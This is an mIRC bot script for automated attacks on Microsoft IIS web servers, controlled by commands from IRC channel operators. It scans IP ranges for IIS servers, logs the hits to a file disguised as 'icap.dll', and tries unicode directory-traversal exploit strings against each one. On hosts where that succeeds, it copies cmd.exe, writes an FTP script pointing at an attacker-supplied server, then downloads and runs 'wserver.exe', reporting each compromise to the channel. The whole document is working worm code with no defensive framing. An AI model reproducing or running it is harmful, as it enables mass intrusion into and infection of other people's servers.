   on 10:TEXT:.iis*:*:{
     if ($nick !isop %chan) { halt }
     if ($2 == $null) { notice $nick IIS (Error) No Variables Supplied (Syntax) .iis start <longip> <longip> $me | halt }
     if ($2 == status) { if ($timer(iis1) != $null) { if (%akill == $null) { set %akill 0 } | msg %chan2 IIS Scan (Range) $longip(%iis-range3) -> $longip(%iis-range2) (Current) $longip(%iis-range1) (Sockets Open) $sock(unicode*,0) (Found) %akill | halt } | notice $nick IIS Script Unactive }
     if ($2 == clear) { notice $nick IIS Script Cleared | timeriis* off | timeruni* off | timerinfect off | sockclose iis* | sockclose infect* | sockclose unicode* | remove ICAP.dll | unset %akill %codelist %unihost %step %t1 %lol %afound %ascan %infopen %fserver %fuser %fpass %isilent }
     if ($2 == resume) { if ($timer(iis1) != $null) { notice $nick IIS (Error) IIS Script Active | halt } | if (%iis-range1 == $null) { notice $nick IIS (Error) Cannot Resume | halt } | if (%iis-range2 == $null) { notice $nick IIS (Error) Cannot Resume | halt } | if (%iis-range3 == $null) { notice $nick IIS (Error) Cannot Resume | halt } | if (%iis-range1 == %iis-range2) { notice $nick IIS (Error) Scan Complete | halt } | set %iis-range3 %iis-range1 | msg %chan2 IIS Scan in Progress (Range) $longip(%iis-range1) -> $longip(%iis-range2) | timeriis1 -o 0 2 grange1 | timeriis2 -o 0 2 grange1 | timeriis3 -o 0 2 grange1 | timeriis4 -o 0 2 grange1 | timeriis5 -o 0 2 grange1 | timerinfect -o 0 30 infchk }
     if ($2 == stop) { if ($timer(iis1) == $null) { notice $nick IIS Script Unactive | halt } | notice $nick IIS Scan Stopped | timeriis* off | timeruni* off | timerinfect off | sockclose iis* | sockclose infect* | sockclose unicode* }
     if ($2 == set)  { if ($5 == $null) { notice $nick IIS (Error) Incorrect Variables (Syntax) .iis set <ftp> <login> <password> | halt } | msg %chan2 IIS (FTP) $3 (Login) $4 (Password) $5 | set %fserver $3 | set %fuser $4 | set %fpass $5 }
     if ($2 == info) { if (%fserver == $null) || (%fuser == $null) || (%fpass == $null) { notice $nick IIS (Error) FTP Information Unset (Syntax) .iis set <ftp> <login> <password> | halt } | msg %chan2 IIS (FTP) %fserver (Login) %fuser (Password) %fpass }
     if ($2 == silence) && ($3 == on) { notice $nick IIS Script Silenced | set %isilent done }
     if ($2 == silence) && ($3 == off) { notice $nick IIS Script Unsilenced | unset %isilent }
     if ($2 == root) { if (%afound == $null) { set %afound 0 } | if (%akill == $null) { set %akill 0 } | if (%ascan == $null) { set %ascan 0 } | msg %chan2 IIS Root (Scanned/Total) %ascan $+ / $+ %akill (Sockets Open) $calc($sock(infect*,0) + ($sock(unicode*,0))) (Exploited) %afound | halt }
     if ($2 == start) && ($3 isnum) && ($4 isnum) && ($5 == $me) {
      if ($timer(iis1) != $null) { notice $nick IIS (Error) IIS Script Active | halt }
      if (%fserver == $null) || (%fuser == $null) || (%fpass == $null) { notice $nick IIS (Error) FTP Information Unset (Syntax) .iis set <ftp> <login> <password> | halt }
         unset %akill %ascan %afound
         set %iis-range1 $3
         set %iis-range2 $4
         set %iis-range3 $3
         msg %chan2 IIS Scan in Progress (Range) $longip(%iis-range1) -> $longip(%iis-range2)
         timeriis1 -o 0 2 grange1
         timeriis2 -o 0 2 grange1
         timeriis3 -o 0 2 grange1
         timeriis4 -o 0 2 grange1
         timeriis5 -o 0 2 grange1
         timerinfect -o 0 30 infchk
       }
   } }
   alias grange1 { iis $grange }
   alias grange { if (%iis-range1 == %iis-range2) { timeriis* off | sockclose iis* | msg %chan2 IIS Scan Complete (Range) $longip(%iis-range1) -> $longip(%iis-range2) (Found) %akill | unset  | halt } | else { inc %iis-range1 | return $longip(%iis-range1) } }
   alias iis {
     sockopen iis $+ $1 $1 80 | timeriis $+ $1 -o 1 5 sockclose iis $+ $1
   }
   on *:sockread:iis*:{
     sockread %iisinfo
     if (Server: Microsoft-IIS isin %iisinfo) { inc %akill | write icap.dll $sock($sockname).ip | sockclose $sockname | if (%isilent != done) { msg %chan2 IIS Scan Found (Amount) %akill | halt } }
     if ($sockerr > 0) { sockclose $sockname | return }
   }
   on *:sockopen:iis*:{
     sockwrite -tn $sockname GET /d893y4e9
   }
   alias infchk {
     if ($sock(unicode*,*) == 0) && ($sock(infect*,*) == 0) && ($timer(uni1) == $null) { synfull }
      else { halt }
   }
   alias synfull {
     if ($lines(icap.dll) == $null) { timeruni* off | sockclose unicode* | halt }
     if ($timer(iis1) == $null) && ($lines(icap.dll) == 0) { timerinfect off | timerdie -o 1 120 die | halt }
     unset %unihost %codelist
     timeruni* off
     sockclose unicode*
     inc %ascan
     set %codelist $lines(winapi.vxd)
     set %unihost $read(icap.dll, 1)
     write -dl0 icap.dll
     timeruni1 -o 0 2 unicode2
     timeruni2 -o 0 2 unicode2
     timeruni3 -o 0 2 unicode2
     timeridie $+ %unihost -o 1 180 sockclose unicode $+ %unihost $+ *
   }
   alias die {
     timeruni* off
     sockclose unicode*
     sockclose infect*
     unset %codelist %unihost %step %t1 %lol %infopen
     remove icap.dll
   }
   alias unicode2 {
     dec %codelist
     if (%codelist <= 0) { timeruni* off | sockclose unicode $+ %unihost $+ * | timeridie $+ %unihost off | infchk | halt }
     sockopen unicode $+ %unihost $+ %codelist %unihost 80
   }
   On 1:SockOpen:unicode*:{
     if ($sock($sockname).status != active) { halt }
     sockwrite -nt unicode $+ %unihost $+ %codelist GET $read(winapi.vxd, %codelist)
   }
   On 1:SockRead:unicode*:{
     if ($sockerr > 0) { return }
     :nextread
     sockread %temp
     if ($sockbr == 0) { return }
     if (%temp == $null) %temp = -
     if (Directory of c:\ isin %temp) { timeruni* off | msg %chan2 IIS Root (URL String) http:// $+ $sock($sockname).ip $+ $read(winapi.vxd, %codelist) | infect $sock($sockname).ip %codelist | sockclose unicode $+ %unihost $+ * | halt }
     goto nextread
   }
   alias infect {
     sockclose infect*
     set %lol $read(winapi.vxd, $+ $2 $+ )
     set %t1 $left(%lol,$calc($len(%lol) - 6))
     set %step 1
     set %infopen $1
     timerinfclose $+ $1 -o 1 120 sockclose infect $+ %infopen $+ *
     sockopen infect $+ %infopen $+ %step $1 80
   }
   On 1:SockOpen:infect*:{
     if (%step == 1) { sockwrite -tn $sockname GET %t1 $+ /c+copy+c:\winnt\system32\cmd.exe+\iserver.exe }
     if (%step == 2) { sockwrite -tn $sockname GET $replace(%t1,winnt/system32/cmd.exe,winnt/../iserver.exe) $+ /c+echo+open+ $+ %fserver $+ +>+iserver.scr }
     if (%step == 3) { sockwrite -tn $sockname GET $replace(%t1,winnt/system32/cmd.exe,winnt/../iserver.exe) $+ /c+echo+user+ $+ %fuser $+ +>>+iserver.scr }
     if (%step == 4) { sockwrite -tn $sockname GET $replace(%t1,winnt/system32/cmd.exe,winnt/../iserver.exe) $+ /c+echo+ $+ %fpass $+ +>>+iserver.scr }
     if (%step == 5) { sockwrite -tn $sockname GET $replace(%t1,winnt/system32/cmd.exe,winnt/../iserver.exe) $+ /c+echo+binary+>>+iserver.scr }
     if (%step == 6) { sockwrite -tn $sockname GET $replace(%t1,winnt/system32/cmd.exe,winnt/../iserver.exe) $+ /c+echo+get+wserver.exe+wserver.exe+>>+iserver.scr }
     if (%step == 7) { sockwrite -tn $sockname GET $replace(%t1,winnt/system32/cmd.exe,winnt/../iserver.exe) $+ /c+echo+bye+>>+iserver.scr }
     if (%step == 8) { sockwrite -tn $sockname GET $replace(%t1,winnt/system32/cmd.exe,winnt/../iserver.exe) $+ /c+ftp+-s:iserver.scr+-n+-d }
     if (%step == 9) { sockwrite -tn $sockname GET $replace(%t1,winnt/system32/cmd.exe,winnt/../iserver.exe) $+ /c+wserver.exe }
     if (%step == 10) { inc %afound | msg %chan2 IIS Root (Step) 10/10 Complete | timer -o 1 0 sockclose infect $+ %infopen $+ * | infchk | halt }
   }
   On 1:SockRead:infect*:{
     if ($sockerr > 0) return
     :nextread
     sockread %temp
     if ($sockbr == 0) return
     if (%temp == $null) %temp = -
     if (CGI isin %temp) { msg %chan2 IIS Root (Step) %step $+ /10 | inc %step | timer -o 1 0 sockclose $sockname | timerinfjump -o 1 2 sockopen infect $+ %infopen $+ %step %infopen 80 | halt }
     goto nextread
   } }
